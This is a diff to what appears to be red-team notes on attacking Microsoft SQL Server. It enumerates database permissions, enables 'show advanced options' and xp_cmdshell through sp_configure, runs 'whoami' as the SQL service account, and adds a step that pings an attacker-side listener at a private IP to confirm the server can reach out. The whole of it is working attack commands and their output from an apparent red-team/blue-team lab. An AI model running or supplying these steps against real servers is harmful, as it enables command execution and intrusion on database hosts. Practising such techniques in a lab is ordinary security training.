@@ -87,12 +87,10 @@ GO
 6> ,       perm.class_desc
 7> ,       object_name(perm.major_id)
 8> from    sys.database_principals princ
-go
-
 9> left join
 10>         sys.database_permissions perm
 11> on      perm.grantee_principal_id = princ.principal_id
-
+go
 
 
 #List Database structure and tables
@@ -118,7 +116,7 @@ go
 #Enable shell
 1> EXEC sp_configure 'show advanced options', 1;
 2> go
-Msg 15457 (severity 0, state 1) from TALLY, Procedure sp_configure Line 185:
+Msg 15457 (severity 0, state 1) from SERVER, Procedure sp_configure Line 185:
 	"Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install."
 (return status = 0)
 
@@ -127,7 +125,7 @@ Msg 15457 (severity 0, state 1) from TALLY, Procedure sp_configure Line 185:
 
 1> EXEC sp_configure 'xp_cmdshell', 1;
 2> go
-Msg 15457 (severity 0, state 1) from TALLY, Procedure sp_configure Line 185:
+Msg 15457 (severity 0, state 1) from SERVER, Procedure sp_configure Line 185:
 	"Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install."
 (return status = 0)
 
@@ -137,12 +135,12 @@ Msg 15457 (severity 0, state 1) from TALLY, Procedure sp_configure Line 185:
 2> exec xp_cmdshell 'whoami';
 3> go
 output
-tally\sarah
+nt service\mssqlserver
 NULL
 (2 rows affected)
 (return status = 0)
 output
-tally\sarah
+nt service\mssqlserver
 NULL
 (2 rows affected)
 (return status = 0)
@@ -155,6 +153,15 @@ C:\Windows\system32
 NULL
 (2 rows affected)
 (return status = 0)
+
+
+#Check if can ping (BlueTeam Database SQL Server 2019)
+#tcpdump -nni eth0 icmp (open listener on RedTeam)
+1> EXEC xp_cmdshell 'ping 192.168.122.64';
+2> go
+
+21:49:44.343678 IP x.x.x.x > x.x.x.x: ICMP echo request, id 1, seq 1, length 40
+21:49:44.343712 IP x.x.x.x > x.x.x.x: ICMP echo reply, id 1, seq 1, length 40
 
 
 #Enable xp_cmdshell
